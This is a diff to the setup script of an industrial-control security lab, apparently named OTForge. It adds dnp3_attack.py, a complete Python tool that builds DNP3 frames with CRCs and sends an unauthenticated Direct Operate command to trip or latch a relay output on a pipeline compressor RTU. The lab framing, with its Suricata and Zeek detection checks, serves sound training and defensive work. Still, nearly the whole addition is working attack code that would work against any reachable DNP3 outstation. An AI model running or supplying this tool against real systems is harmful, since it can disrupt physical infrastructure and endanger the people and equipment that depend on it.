@@ -625,11 +625,249 @@ PYEOF
 
 chmod +x /root/Desktop/Attack_Scripts/monitor_level.py
 
+# ── dnp3_attack.py ─────────────────────────────────────────────────────────────
+# Lab 03: DNP3 Direct Operate attack against a compressor RTU.
+# Sends FC 03 (Direct Operate) to Binary Output 0 on a DNP3 outstation — the
+# same command an authorized SCADA master would send, but from an unauthorized
+# source. Requires no credentials; DNP3 has no built-in authentication.
+cat > /root/Desktop/Attack_Scripts/dnp3_attack.py << 'PYEOF'
+#!/usr/bin/env python3
+"""
+dnp3_attack.py — DNP3 Direct Operate attack against a compressor RTU.
+
+Sends Function Code 03 (Direct Operate) for Binary Output 0 to the target
+DNP3 outstation. In ICS Lab 03 (Ironhorse Midstream), Binary Output 0 on
+RTU-2 (outstation address 11) controls the Compressor B contactor relay.
+
+Usage:
+    python3 dnp3_attack.py <rtu-ip> [--outstation 11] [--port 20000] [--on]
+
+Examples:
+    python3 dnp3_attack.py 10.200.10.11
+    python3 dnp3_attack.py 10.200.10.11 --outstation 11 --on
+"""
+
+import argparse
+import socket
+import struct
+import sys
+import os
+
+
+# ── DNP3 CRC-16/DNP ──────────────────────────────────────────────────────────
+
+def _build_crc_table():
+    """Pre-compute the 256-entry CRC-16/DNP lookup table (polynomial 0xA6BC)."""
+    table = []
+    for i in range(256):
+        crc = i
+        for _ in range(8):
+            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
+        table.append(crc)
+    return table
+
+_CRC_TABLE = _build_crc_table()
+
+
+def crc16(data):
+    """Compute CRC-16/DNP checksum over data bytes."""
+    crc = 0
+    for byte in data:
+        crc = (crc >> 8) ^ _CRC_TABLE[(crc ^ byte) & 0xFF]
+    return crc ^ 0xFFFF
+
+
+def crc_le(data):
+    """Return 2-byte little-endian CRC for a data block."""
+    return struct.pack("<H", crc16(data))
+
+
+# ── Link layer ─────────────────────────────────────────────────────────────────
+
+def build_link_frame(ctrl, dest, src, payload):
+    """
+    Encode a complete DNP3 link-layer frame.
+
+    Link header: 0x05 0x64 | length | ctrl | dest(2LE) | src(2LE) | crc(2)
+    Payload is split into 16-byte blocks, each followed by a 2-byte CRC.
+    """
+    data_len = 5 + len(payload)
+    header = bytes([0x05, 0x64, data_len, ctrl]) + struct.pack("<HH", dest, src)
+    frame = header + crc_le(header)
+    for i in range(0, len(payload), 16):
+        block = payload[i : i + 16]
+        frame += block + crc_le(block)
+    return frame
+
+
+# ── Application layer ──────────────────────────────────────────────────────────
+
+def build_direct_operate(app_seq, outstation_addr, master_addr, bo_index=0, latch_on=False):
+    """
+    Build a DNP3 Direct Operate frame (FC 03) for Group 12 Var 1 (CROB).
+
+    CROB (Control Relay Output Block) is the standard DNP3 object for
+    commanding binary outputs. This function commands Binary Output bo_index
+    to LATCH_ON (True) or LATCH_OFF (False).
+
+    FC 03 is a confirmed operate — the outstation is expected to send back
+    a response confirming the operate. FC 04 (Direct Operate No Ack) skips
+    the response step.
+    """
+    # CROB control code: 0x03=LATCH_ON, 0x04=LATCH_OFF
+    control_code = 0x03 if latch_on else 0x04
+
+    # Application layer: header + object
+    app_data = bytes([
+        0xC0 | (app_seq & 0x0F),   # FIR=1, FIN=1, CON=0, UNS=0, SEQ
+        0x03,                       # Function Code 3: Direct Operate
+        12, 1, 0x28, 1,             # G12V1, qualifier 0x28 = 8-bit count+idx prefix, count=1
+        bo_index,                   # Binary Output index (0 = first output)
+        control_code,               # CROB control code (LATCH_ON or LATCH_OFF)
+        0x01,                       # Repeat count = 1
+        0x64, 0x00, 0x00, 0x00,    # onTime  = 100 ms (little-endian uint32)
+        0x64, 0x00, 0x00, 0x00,    # offTime = 100 ms (little-endian uint32)
+        0x00,                       # Status byte (cleared in request)
+    ])
+
+    # Transport layer: FIR=1, FIN=1 (single-segment message), SEQ=0
+    transport = bytes([0xC0]) + app_data
+
+    # Link layer: ctrl=0xC4 → DIR=1 (master→outstation), PRM=1, FC=4 UNCONFIRMED_DATA
+    return build_link_frame(0xC4, outstation_addr, master_addr, transport)
+
+
+# ── Attack ────────────────────────────────────────────────────────────────────
+
+def run_attack(host, port, outstation_addr, master_addr, bo_index, latch_on, timeout):
+    """Connect to the target RTU and send a Direct Operate command."""
+    op = "LATCH_ON (activate output)" if latch_on else "LATCH_OFF (trip output)"
+    print(f"[dnp3-attack] Target:     {host}:{port}")
+    print(f"[dnp3-attack] Outstation: {outstation_addr}  Master: {master_addr}")
+    print(f"[dnp3-attack] Command:    Direct Operate (FC 03) → Binary Output {bo_index} → {op}")
+    print()
+    print("[dnp3-attack] NOTE: DNP3 requires no credentials — any host on the OT network")
+    print("[dnp3-attack] can send this command. This is what makes the attack possible.")
+    print()
+
+    # Step 1: TCP connect
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((host, port))
+    except ConnectionRefusedError:
+        print(f"[dnp3-attack] ERROR: Connection refused — {host}:{port} is not reachable.")
+        print("[dnp3-attack] If an IPS reject rule is active, this is the expected result!")
+        sys.exit(2)
+    except socket.timeout:
+        print(f"[dnp3-attack] ERROR: Connection timed out after {timeout}s.")
+        sys.exit(1)
+    except OSError as exc:
+        print(f"[dnp3-attack] ERROR: {exc}")
+        sys.exit(1)
+
+    print(f"[dnp3-attack] TCP connection established to {host}:{port}")
+
+    # Step 2: Build and send the Direct Operate frame
+    frame = build_direct_operate(
+        app_seq=0,
+        outstation_addr=outstation_addr,
+        master_addr=master_addr,
+        bo_index=bo_index,
+        latch_on=latch_on,
+    )
+    print(f"[dnp3-attack] Sending Direct Operate frame ({len(frame)} bytes):")
+    print(f"[dnp3-attack]   Start bytes:    05 64  (DNP3 sync)")
+    print(f"[dnp3-attack]   Function code:  03     (Direct Operate)")
+    print(f"[dnp3-attack]   Object type:    G12V1  (Control Relay Output Block)")
+    print(f"[dnp3-attack]   Full frame hex: {frame.hex(' ')}")
+    print()
+    sock.sendall(frame)
+    print("[dnp3-attack] Direct Operate packet transmitted — waiting for response ...")
+
+    # Step 3: Read response (outstation may or may not send one)
+    try:
+        resp_header = sock.recv(10)
+        if resp_header and resp_header[:2] == b"\x05\x64":
+            print(f"[dnp3-attack] Response received ({len(resp_header)} bytes) — outstation responded.")
+        elif resp_header:
+            print(f"[dnp3-attack] Unexpected response: {resp_header.hex(' ')}")
+        else:
+            print("[dnp3-attack] Server closed connection without responding.")
+    except socket.timeout:
+        print(f"[dnp3-attack] No DNP3 response within {timeout}s.")
+        print("[dnp3-attack] The packet was still delivered — Suricata should have seen it.")
+
+    sock.close()
+
+    print()
+    print("[dnp3-attack] ═══════════════════════════════════════════════════════════")
+    print("[dnp3-attack]  ATTACK COMPLETE")
+    print(f"[dnp3-attack]  Direct Operate (FC 03) sent to {host} outstation {outstation_addr}")
+    print(f"[dnp3-attack]  Binary Output {bo_index} commanded → {op}")
+    print("[dnp3-attack]  Now check: OTForge Monitor → Suricata tab for the alert.")
+    print("[dnp3-attack]             OTForge Monitor → Zeek  tab for the connection log.")
+    print("[dnp3-attack] ═══════════════════════════════════════════════════════════")
+
+
+def main():
+    default_ip = os.getenv("RTU_IP", "10.200.10.11")
+    parser = argparse.ArgumentParser(
+        description="DNP3 Direct Operate attack — ICS Lab 03 (Ironhorse Midstream)"
+    )
+    parser.add_argument(
+        "target", nargs="?", default=default_ip,
+        help=f"IP of target RTU/IED (default: {default_ip} = RTU-2 Compressor Stn B)"
+    )
+    parser.add_argument(
+        "--outstation", type=int, default=11,
+        help="DNP3 outstation address (default 11 = RTU-2)"
+    )
+    parser.add_argument(
+        "--master", type=int, default=1,
+        help="DNP3 master address to use in frames (default 1)"
+    )
+    parser.add_argument(
+        "--port", type=int, default=20000,
+        help="TCP port (default 20000)"
+    )
+    parser.add_argument(
+        "--output", type=int, default=0,
+        help="Binary Output index to target (default 0)"
+    )
+    parser.add_argument(
+        "--on", action="store_true",
+        help="Send LATCH_ON instead of LATCH_OFF (activate output rather than trip)"
+    )
+    parser.add_argument(
+        "--timeout", type=float, default=5.0,
+        help="Socket timeout in seconds (default 5)"
+    )
+    args = parser.parse_args()
+
+    run_attack(
+        host=args.target,
+        port=args.port,
+        outstation_addr=args.outstation,
+        master_addr=args.master,
+        bo_index=args.output,
+        latch_on=args.on,
+        timeout=args.timeout,
+    )
+
+
+if __name__ == "__main__":
+    main()
+PYEOF
+
+chmod +x /root/Desktop/Attack_Scripts/dnp3_attack.py
+
 echo "[otforge-attack] Attack_Scripts created:"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/read_coils.py    — read coil + register state (one-shot)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/write_coil.py    — coil write attack (--restore to undo)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/plc_init.py      — re-seed PLC baseline (inlet pump=ON, outlet valve=OPEN)"
 echo "[otforge-attack]   /root/Desktop/Attack_Scripts/monitor_level.py — live tank-level bar (--fast for 0.5 s poll)"
+echo "[otforge-attack]   /root/Desktop/Attack_Scripts/dnp3_attack.py   — DNP3 Direct Operate attack (Lab 03)"
 
 # ── PLC Modbus baseline initialization ────────────────────────────────────────
 # Runs in the background so VNC/noVNC startup is not delayed.
